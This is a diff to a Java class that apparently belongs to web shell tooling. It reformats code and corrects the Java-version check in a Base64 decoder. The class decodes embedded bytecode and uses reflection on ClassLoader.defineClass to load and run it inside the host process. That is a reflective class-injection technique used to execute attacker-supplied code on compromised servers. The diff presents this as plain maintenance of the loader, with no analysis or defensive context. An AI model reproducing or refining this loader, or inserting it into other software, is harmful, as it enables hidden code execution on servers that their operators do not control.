@@ -12,6 +12,7 @@ public class Info {
     public String cs;
     public String randomPrefix;
     public String decoderClassdata;
+
     @Override
     public boolean equals(Object obj) {
         try {
@@ -99,17 +100,19 @@ public class Info {
         }
         return s.toString();
     }
+
     public String asoutput(String str) {
         try {
             byte[] classBytes = Base64DecodeToByte(decoderClassdata);
-            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
+            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
             defineClassMethod.setAccessible(true);
-            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0,classBytes.length);
+            Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), classBytes, 0, classBytes.length);
             return cc.getConstructor(String.class).newInstance(str).toString();
         } catch (Exception e) {
             return str;
         }
     }
+
     String decode(String str) throws Exception {
         int prefixlen = 0;
         try {
@@ -123,20 +126,21 @@ public class Info {
         }
         return str;
     }
+
     public byte[] Base64DecodeToByte(String str) {
         byte[] bt = null;
         String version = System.getProperty("java.version");
         try {
             if (version.compareTo("1.9") >= 0) {
-                Class clazz = Class.forName("sun.misc.BASE64Decoder");
-                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
-            } else {
                 Class clazz = Class.forName("java.util.Base64");
                 Object decoder = clazz.getMethod("getDecoder").invoke(null);
                 bt = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            } else {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                bt = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
             }
             return bt;
-        }catch (Exception e) {
+        } catch (Exception e) {
             return new byte[]{};
         }
     }
